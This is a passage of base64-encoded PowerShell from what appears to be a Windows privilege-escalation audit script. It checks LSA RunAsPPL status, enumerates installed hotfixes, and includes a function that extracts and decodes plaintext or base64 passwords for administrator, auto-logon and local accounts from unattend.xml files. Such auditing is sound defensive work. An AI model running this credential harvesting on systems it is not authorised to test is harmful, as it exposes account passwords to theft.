pbm9yIC1nZSAzKSApKSB7CgogICAgICAgICRSZWdQYXRoID0gIkhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxMc2EiCiAgICAgICAgJFJlc3VsdCA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggIlJFZ2lzdHJ5OjokKCRSZWdQYXRoKSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0SXRlbVByb3BlcnR5RXJyb3IKCiAgICAgICAgaWYgKC1ub3QgJEdldEl0ZW1Qcm9wZXJ0eUVycm9yKSB7CgogICAgICAgICAgICBpZiAoLW5vdCAoJE51bGwgLWVxICRSZXN1bHQuUnVuQXNQUEwpKSB7CgogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQuUnVuQXNQUEwgLWVxIDEpIHsKICAgICAgICAgICAgICAgICAgICAkU3RhdHVzID0gJFRydWUgCiAgICAgICAgICAgICAgICAgICAgJERlc2NyaXB0aW9uID0gIlJ1bkFzUFBMIGlzIGVuYWJsZWQiCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRTdGF0dXMgPSAkRmFsc2UgCiAgICAgICAgICAgICAgICAgICAgJERlc2NyaXB0aW9uID0gIlJ1bkFzUFBMIGlzIGRpc2FibGVkIgogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRTdGF0dXMgPSAkRmFsc2UgCiAgICAgICAgICAgICAgICAkRGVzY3JpcHRpb24gPSAiUnVuQXNQUEwgaXMgbm90IGNvbmZpZ3VyZWQiCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgfSBlbHNlIHsKICAgICAgICAjIFJ1bkFzUFBMIG5vdCBzdXBwb3J0ZWQgCiAgICAgICAgJFN0YXR1cyA9ICRGYWxzZSAKICAgICAgICAkRGVzY3JpcHRpb24gPSAiUnVuQXNQUEwgaXMgbm90IHN1cHBvcnRlZCBvbiB0aGlzIE9TIgogICAgfQoKICAgICRMc2FSdW5Bc1BwbFN0YXR1cyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAkTHNhUnVuQXNQcGxTdGF0dXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgIlJ1bkFzUFBMIgogICAgJExzYVJ1bkFzUHBsU3RhdHVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU3RhdHVzIiAtVmFsdWUgJFN0YXR1cwogICAgJExzYVJ1bkFzUHBsU3RhdHVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRGVzY3JpcHRpb24iIC1WYWx1ZSAkRGVzY3JpcHRpb24KICAgICRMc2FSdW5Bc1BwbFN0YXR1cwoKfQoKZnVuY3Rpb24gR2V0LVVuYXR0ZW5kU2Vuc2l0aXZlRGF0YSB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgSGVscGVyIC0gRXh0cmFjdCBzZW5zaXRpdmUgZGF0YSBmcm9tIGFuICJ1bmF0dGVuZCIgWE1MIGZpbGUKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFVuYXR0ZW5kIGZpbGVzIGFyZSBYTUwgZG9jdW1lbnRzIHdoaWNoIG1heSBjb250YWluIGNsZWFydGV4dCBwYXNzd29yZHMgaWYgdGhleSBhcmUgbm90CiAgICBwcm9wZXJseSBzYW5pdGl6ZWQuIE1vc3Qgb2YgdGhlIHRpbWUsICJQYXNzd29yZCIgZmllbGRzIHdpbGwgYmUgcmVwbGFjZWQgYnkgdGhlIGdlbmVyaWMKICAgICIqU0VOU0lUSVZFKkRBVEEqREVMRVRFRCoiIG1lbnRpb24gYnV0IHNvbWV0aW1lcywgdGhlIG9yaWdpbmFsIHZhbHVlIHJlbWFpbnMgYW5kIGlzIGVpdGhlcgogICAgcHJlc2VudCBpbiBpdHMgcGxhaW50ZXh0IGZvcm0gb3IgYmFzZTY0LWVuY29kZWQgZm9ybS4gSWYgYSBub24tZW1wdHkgcGFzc3dvcmQgZmllbGQgaXMgZm91bmQKICAgIGFuZCBpZiBpdCdzIG5vdCBlcXVhbCB0byB0aGUgZGVmYXVsdCAiKlNFTlNJVElWRSpEQVRBKkRFTEVURUQqIiwgdGhpcyBmdW5jdGlvbiB3aWxsIHJldHVybiB0aGUKICAgIGNvcnJlc3BvbmRpbmcgc2V0IG9mIGNyZWRlbnRpYWxzOiBkb21haW4sIHVzZXJuYW1lIGFuZCAoZGVjb2RlZCkgcGFzc3dvcmQuIAogICAgCiAgICAuUEFSQU1FVEVSIFBhdGgKCiAgICBUaGUgUGF0aCBvZiB0aGUgInVuYXR0ZW5kLnhtbCIgZmlsZSB0byBwYXJzZQogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gR2V0LVVuYXR0ZW5kU2Vuc2l0aXZlRGF0YSAtUGF0aCBDOlxXaW5kb3dzXFBhbnRoZXJcVW5hdHRlbmQueG1sCgogICAgVHlwZSAgICAgICAgIERvbWFpbiAgICAgIFVzZXJuYW1lICAgICAgUGFzc3dvcmQKICAgIC0tLS0gICAgICAgICAtLS0tLS0gICAgICAtLS0tLS0tLSAgICAgIC0tLS0tLS0tCiAgICBDcmVkZW50aWFscyAgY29udG9zby5jb20gQWRtaW5pc3RyYXRvciBQYXNzd29yZDEKICAgIExvY2FsQWNjb3VudCBOL0EgICAgICAgICBKb2huICAgICAgICAgIFBhc3N3b3JkMQogICAgQXV0b0xvZ29uICAgIC4gICAgICAgICAgIEFkbWluaXN0cmF0b3IgUEBzc3cwcmQKICAgIAogICAgLk5PVEVTIAoKICAgIEEgcGFzc3dvcmQgY2FuIGJlIHN0b3JlZCBpbiB0aHJlZSBmb3JtYXRzOgoKICAgIDEpIFNpbXBsZSBzdHJpbmcKCiAgICAgICAgPFBhc3N3b3JkPlBhc3N3b3JkPC9QYXNzd29yZD4KCiAgICAyKSBYTUwgbm9kZSArIHBsYWluIHZhbHVlCiAgICAKICAgICAgICA8UGFzc3dvcmQ+CiAgICAgICAgICAgIDxWYWx1ZT5QYXNzd29yZDwvVmFsdWU+CiAgICAgICAgICAgIDxQbGFpblRleHQ+dHJ1ZTwvUGxhaW5UZXh0PgogICAgICAgIDwvUGFzc3dvcmQ+CgogICAgMykgWE1MIG5vZGUgKyBiYXNlNjQtZW5jb2RlZCB2YWx1ZQoKICAgICAgICA8UGFzc3dvcmQ+CiAgICAgICAgICAgIDxWYWx1ZT5VQUJoQUhNQWN3QjNBRzhBY2dCa0FBPT08L1ZhbHVlPgogICAgICAgICAgICA8UGxhaW5UZXh0PmZhbHNlPC9QbGFpblRleHQ+CiAgICAgICAgPC9QYXNzd29yZD4gCgogICAgLyFcIFVOSUNPREUgZW5jb2RpbmchCgogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXVBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV0KICAgICAgICBbc3RyaW5nXSRQYXRoCiAgICApCgogICAgZnVuY3Rpb24gR2V0LURlY29kZWRQYXNzd29yZCB7CgogICAgICAgIFtDbWRsZXRCaW5kaW5nKCldUGFyYW0oCiAgICAgICAgICAgIFtvYmplY3RdJFhtbE5vZGUKICAgICAgICApCgogICAgICAgIGlmICgkWG1sTm9kZS5HZXRUeXBlKCkuTmFtZSAtZXEgInN0cmluZyIpIHsKICAgICAgICAgICAgJFhtbE5vZGUKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoJFhtbE5vZGUpIHsKICAgICAgICAgICAgICAgIGlmICgkWG1sTm9kZS5QbGFpblRleHQgLWVxICJmYWxzZSIpIHsKICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRYbWxOb2RlLlZhbHVlKSkKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFhtbE5vZGUuVmFsdWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBbeG1sXSAkWG1sID0gR2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0Q29udGVudEVycm9yCgogICAgaWYgKC1ub3QgJEdldENvbnRlbnRFcnJvcikgewoKICAgICAgICAkWG1sLkdldEVsZW1lbnRzQnlUYWdOYW1lKCJDcmVkZW50aWFscyIpIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgJFBhc3N3b3JkID0gR2V0LURlY29kZWRQYXNzd29yZCAtWG1sTm9kZSAkXy5QYXNzd29yZAoKICAgICAgICAgICAgaWYgKCRQYXNzd29yZCAtYW5kICggLW5vdCAoJFBhc3N3b3JkIC1lcSAiKlNFTlNJVElWRSpEQVRBKkRFTEVURUQqIikpKSB7CiAgICAgICAgICAgICAgICAkSXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlR5cGUiIC1WYWx1ZSAiQ3JlZGVudGlhbHMiCiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkRvbWFpbiIgLVZhbHVlICRfLkRvbWFpbgogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VybmFtZSIgLVZhbHVlICRfLlVzZXJuYW1lCiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhc3N3b3JkIiAtVmFsdWUgJFBhc3N3b3JkCiAgICAgICAgICAgICAgICAkSXRlbQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgCiAgICAgICAgJFhtbC5HZXRFbGVtZW50c0J5VGFnTmFtZSgiTG9jYWxBY2NvdW50IikgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAkUGFzc3dvcmQgPSBHZXQtRGVjb2RlZFBhc3N3b3JkIC1YbWxOb2RlICRfLlBhc3N3b3JkCiAgICAKICAgICAgICAgICAgaWYgKCRQYXNzd29yZCAtYW5kICggLW5vdCAoJFBhc3N3b3JkIC1lcSAiKlNFTlNJVElWRSpEQVRBKkRFTEVURUQqIikpKSB7CiAgICAgICAgICAgICAgICAkSXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlR5cGUiIC1WYWx1ZSAiTG9jYWxBY2NvdW50IgogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEb21haW4iIC1WYWx1ZSAiTi9BIgogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VybmFtZSIgLVZhbHVlICRfLk5hbWUKICAgICAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGFzc3dvcmQiIC1WYWx1ZSAkUGFzc3dvcmQKICAgICAgICAgICAgICAgICRJdGVtCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAKICAgICAgICAkWG1sLkdldEVsZW1lbnRzQnlUYWdOYW1lKCJBdXRvTG9nb24iKSB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgICRQYXNzd29yZCA9IEdldC1EZWNvZGVkUGFzc3dvcmQgLVhtbE5vZGUgJF8uUGFzc3dvcmQKCiAgICAgICAgICAgIGlmICgkUGFzc3dvcmQgLWFuZCAoIC1ub3QgKCRQYXNzd29yZCAtZXEgIipTRU5TSVRJVkUqREFUQSpERUxFVEVEKiIpKSkgewogICAgICAgICAgICAgICAgJEl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJUeXBlIiAtVmFsdWUgIkF1dG9Mb2dvbiIKICAgICAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRG9tYWluIiAtVmFsdWUgJF8uRG9tYWluCiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZXJuYW1lIiAtVmFsdWUgJF8uVXNlcm5hbWUKICAgICAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGFzc3dvcmQiIC1WYWx1ZSAkUGFzc3dvcmQKICAgICAgICAgICAgICAgICRJdGVtCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRYbWwuR2V0RWxlbWVudHNCeVRhZ05hbWUoIkFkbWluaXN0cmF0b3JQYXNzd29yZCIpIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgJFBhc3N3b3JkID0gR2V0LURlY29kZWRQYXNzd29yZCAtWG1sTm9kZSAkXwoKICAgICAgICAgICAgaWYgKCRQYXNzd29yZCAtYW5kICggLW5vdCAoJFBhc3N3b3JkIC1lcSAiKlNFTlNJVElWRSpEQVRBKkRFTEVURUQqIikpKSB7CiAgICAgICAgICAgICAgICAkSXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlR5cGUiIC1WYWx1ZSAiQWRtaW5pc3RyYXRvclBhc3N3b3JkIgogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEb21haW4iIC1WYWx1ZSAiTi9BIgogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VybmFtZSIgLVZhbHVlICJOL0EiCiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhc3N3b3JkIiAtVmFsdWUgJFBhc3N3b3JkCiAgICAgICAgICAgICAgICAkSXRlbQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBHZXQtSG90Rml4TGlzdCB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgSGVscGVyIC0gR2V0cyBhIGxpc3Qgb2YgaW5zdGFsbGVkIHVwZGF0ZXMgYW5kIGhvdGZpeGVzLgogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBUaGlzIGNoZWNrIHJlYWRzIHRoZSByZWdpc3RyeSBpbiBvcmRlciB0byBlbnVtZXJhdGUgYWxsIHRoZSBpbnN0YWxsZWQgS0IgaG90Zml4ZXMuIFRoZSBvdXRwdXQKICAgIGlzIHNvcnRlZCBieSBkYXRlIHNvIHRoYXQgbW9zdCByZWNlbnQgcGF0Y2hlcyBhcHBlYXIgZmlyc3QgaW4gdGhlIGxpc3QuIFRoZSBvdXRwdXQgaXMgc2ltaWxhcgogICAgdG8gdGhlIG91dHB1dCBvZiB0aGUgYnVpbHQtaW4gJ0dldC1Ib3RGaXgnIHBvd2Vyc2hlbGwgY29tbWFuZC4gVGhlcmUgaXMgYSBtYWpvciBkaWZmZXJlbmNlCiAgICBiZXR3ZWVuIHRoaXMgc2NyaXB0IGFuZCB0aGUgJ0dldC1Ib3RGaXgnIGNvbW1hbmQgdGhvdWdoLiBUaGUgbGF0dGVyIHJlbGllcyBvbiBXTUkgdG8gZGVsZWdhdGUKICAgIHRoZSAiZW51bWVyYXRpb24iIHdoZXJlYXMgdGhpcyBzY3JpcHQgZGlyZWN0bHkgcGFyc2VzIHRoZSByZWdpc3RyeS4gVGhlIG90aGVyIGJlbmVmaXQgb2YgdGhpcyAKICAgIG1ldGhvZCBpcyB0aGF0IGl0IGFsbG93cyBvbmUgdG8gZXh0cmFjdCBtb3JlIGluZm9ybWF0aW9uIHJlbGF0ZWQgdG8gdGhlIEtCcyAoYWx0aG91Z2ggaXQncyBub3QKICAgIGluIHRoZSBvdXRwdXQgb2YgdGhpcyBzY3JpcHQpLiBJZiB0aGUgY3VycmVudCB1c2VyIGNhbid0IHJlYWQgdGhlIHJlZ2lzdHJ5LCB0aGUgc2NyaXB0IGZhbGxzCiAgICBiYWNrIHRvIHRoZSBidWlsdC1pbiAnR2V0LUhvdEZpeCcgY21kbGV0LgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gR2V0LUhvdEZpeExpc3QKCiAgICBIb3RGaXhJRCAgRGVzY3JpcHRpb24gICAgIEluc3RhbGxlZEJ5ICAgICAgICAgICBJbnN0YWxsZWRPbgogICAgLS0tLS0tLS0gIC0tLS0tLS0tLS0tICAgICAtLS0tLS0tLS0tLSAgICAgICAgICAgLS0tLS0tLS0tLS0KICAgIEtCNDU1Nzk2OCBTZWN1cml0eSBVcGRhdGUgICAgICAgICAgICAgICAgICAgICAgIDIwMjAtMDUtMTEgMDc6Mzc6MDkKICAgIEtCNDU2MDM2NiBTZWN1cml0eSBVcGRhdGUgREVTS1RPUC03QTBBS1FJXGFkbWluIDIwMjAtMDYtMjIgMTI6NDA6MzkKICAgIEtCNDU2Njc4NSBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDctMTYgMTM6MDg6MTQKICAgIEtCNDU3MDMzNCBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDgtMTMgMTc6NDU6MzQKICAgIEtCNDU3NzI2NiBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDktMTEgMTM6Mzc6NTkKICAgIEtCNDUzNzc1OSBTZWN1cml0eSBVcGRhdGUgICAgICAgICAgICAgICAgICAgICAgIDIwMjAtMDUtMTEgMDc6NDQ6MTQKICAgIEtCNDU2MTYwMCBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDYtMjIgMTM6MDA6NTAKICAgIEtCNDU3ODk2OCBVcGRhdGUgICAgICAgICAgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMTAtMTQgMTg6MDY6MTgKICAgIEtCNDU4MDMyNSBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMTAtMTQgMTM6MDk6MzcKCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICBmdW5jdGlvbiBHZXQtUGFja2FnZUluZm8gewoKICAgICAgICBwYXJhbSgKICAgICAgICAgICAgW3N0cmluZ10kUGF0aAogICAgICAgICkKCiAgICAgICAgJEluZm8gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAoKICAgICAgICBbeG1sXSAkUGFja2FnZUNvbnRlbnRYbWwgPSBHZXQtQ29udGVudCAtUGF0aCAkUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBHZXRDb250ZW50RXJyb3IKICAgICAgICBpZiAoLW5vdCAkR2V0Q29udGVudEVycm9yKSB7CgogICAgICAgICAgICAkUGFja2FnZUNvbnRlbnRYbWwuR2V0RWxlbWVudHNCeVRhZ05hbWUoImFzc2VtYmx5IikgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgJEluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEaXNwbGF5TmFtZSIgLVZhbHVlICIkKCRfLmRpc3BsYXlOYW1lKSIKICAgICAgICAgICAgICAgICRJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU3VwcG9ydEluZm9ybWF0aW9uIiAtVmFsdWUgIiQoJF8uc3VwcG9ydEluZm9ybWF0aW9uKSIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFBhY2thZ2VDb250ZW50WG1sLkdldEVsZW1lbnRzQnlUYWdOYW1lKCJwYWNrYWdlIikgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgJEluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJJZGVudGlmaWVyIiAtVmFsdWUgIiQoJF8uaWRlbnRpZmllcikiCiAgICAgICAgICAgICAgICAkSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJlbGVhc2VUeXBlIiAtVmFsdWUgIiQoJF8ucmVsZWFzZVR5cGUpIgogICAgICAgICAgICB9CgogICAgICAgICAgICAkSW5mbwogICAgICAgIH0KICAgIH0KCiAgICBpZiAoJENhY2hlZEhvdEZpeExpc3QuQ291bnQgLWVxIDApIHsKCiAgICAgICAgIyBJbiB0aGUgcmVnaXN0cnksIG9uZSBLQiBtYXkgaGF2ZSBtdWx0aXBsZSBlbnRyaWVzIGJlY2F1c2UgaXQgY2FuIGJlIHNwbGl0IHVwIGludG8gbXVsdGlwbGUKICAgICAgICAjIHBhY2thZ2VzLiBUaGlzIGFycmF5IHdpbGwgaGVscCBrZWVwIHRyYWNrIG9mIEtCcyB0aGF0IGhhdmUgYWxyZWFkeSBiZWVuIGNoZWNrZWQgYnkgdGhlIAogICAgICAgICMgc2NyaXB0LgogICAgICAgICRJbnN0YWxsZWRLQnMgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CgogICAgICAgICRBbGxQYWNrYWdlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggIlJlZ2lzdHJ5OjpIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQ29tcG9uZW50IEJhc2VkIFNlcnZpY2luZ1xQYWNrYWdlcyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgRXJyb3JHZXRDaGlsZEl0ZW0KCiAgICAgICAgaWYgKC1ub3QgJEVycm9yR2V0Q2hpbGRJdGVtKSB7CgogICAgICAgICAgICAkQWxsUGFja2FnZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgCiAgICAgICAgICAgICAgICAjIEZpbHRlciBvbmx5IEtCLXJlbGF0ZWQgcGFja2FnZXMKICAgICAgICAgICAgICAgIGlmICgoJF8uTmFtZSB8IFNwbGl0LVBhdGggLUxlYWYpIC1MaWtlICJQYWNrYWdlXypfZm9yX0tCKiIpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJFBhY2thZ2VQcm9wZXJ0aWVzID0gJF8gfCBHZXQtSXRlbVByb3BlcnR5CiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgIyBHZXQgdGhlIEtCIGlkLCBlLmcuOiBLQlhYWFhYWFgKICAgICAgICAgICAgICAgICAgICAkUGFja2FnZU5hbWUgPSAkUGFja2FnZVByb3BlcnRpZXMuSW5zdGFsbE5hbWUuU3BsaXQoJ34nKVswXS5TcGxpdCgnXycpIHwgV2hlcmUtT2JqZWN0IHsgJF8gLUxpa2UgIktCKiIgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUGFja2FnZU5hbWUpIHsKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgIyBDaGVjayB3aGV0aGVyIHRoaXMgS0IgaGFzIGFscmVhZHkgYmVlbiBoYW5kbGVkCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICgkSW5zdGFsbGVkS0JzIC1jb250YWlucyAkUGFja2FnZU5hbWUpKSB7CiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIEFkZCB0aGUgS0IgaWQgdG8gdGhlIGxpc3Qgc28gd2UgZG9uJ3QgY2hlY2sgaXQgbXVsdGlwbGUgdGltZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFt2b2lkXSRJbnN0YWxsZWRLQnMuQWRkKCRQYWNrYWdlTmFtZSkKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgV2hvIGluc3RhbGxlZCB0aGlzIHVwZGF0ZT8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnN0YWxsZWRCeSA9IENvbnZlcnQtU2lkVG9OYW1lIC1TaWQgJFBhY2thZ2VQcm9wZXJ0aWVzLkluc3RhbGxVc2VyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgR2V0IHRoZSBpbnN0YWxsIGRhdGUuIEl0J3Mgc3RvcmVkIGluIHRoZSByZWdpc3RyeSBqdXN0IGxpa2UgYSBGSUxFVElNRSBzdHJ1Y3R1cmUuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFNvLCB3ZSBoYXZlIHRvIGNvbWJpbmUgdGhlIGxvdyBwYXJ0IGFuZCB0aGUgaGlnaCBwYXJ0IGFuZCBjb252ZXJ0IHRoZSByZXN1bHQgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHRvIGEgRGF0ZVRpbWUgb2JqZWN0LgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJERhdGVIaWdoID0gJFBhY2thZ2VQcm9wZXJ0aWVzLkluc3RhbGxUaW1lSGlnaAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJERhdGVMb3cgPSAkUGFja2FnZVByb3BlcnRpZXMuSW5zdGFsbFRpbWVMb3cKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGaWxlVGltZSA9ICREYXRlSGlnaCAqIFtNYXRoXTo6UG93KDIsIDMyKSArICREYXRlTG93CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW5zdGFsbERhdGUgPSBbRGF0ZVRpbWVdOjpGcm9tRmlsZVRpbWUoJEZpbGVUaW1lKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBQYXJzZSB0aGUgcGFja2FnZSBtZXRhZGF0YSBmaWxlIGFuZCBleHRyYWN0IHNvbWUgdXNlZnVsIGluZm9ybWF0aW9uLi4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VydmljaW5nUGFja2FnZXNQYXRoID0gSm9pbi1QYXRoIC1QYXRoICRlbnY6d2luZGlyIC1DaGlsZFBhdGggInNlcnZpY2luZ1xQYWNrYWdlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYWNrYWdlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkU2VydmljaW5nUGFja2FnZXNQYXRoIC1DaGlsZFBhdGggJFBhY2thZ2VQcm9wZXJ0aWVzLkluc3RhbGxOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUGFja2FnZUluZm8gPSBHZXQtUGFja2FnZUluZm8gLVBhdGggJFBhY2thZ2VQYXRoCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRW50cnkgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFbnRyeSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkhvdEZpeElEIiAtVmFsdWUgIiRQYWNrYWdlTmFtZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFbnRyeSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkRlc2NyaXB0aW9uIiAtVmFsdWUgIiQoJFBhY2thZ2VJbmZvLlJlbGVhc2VUeXBlKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFbnRyeSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbW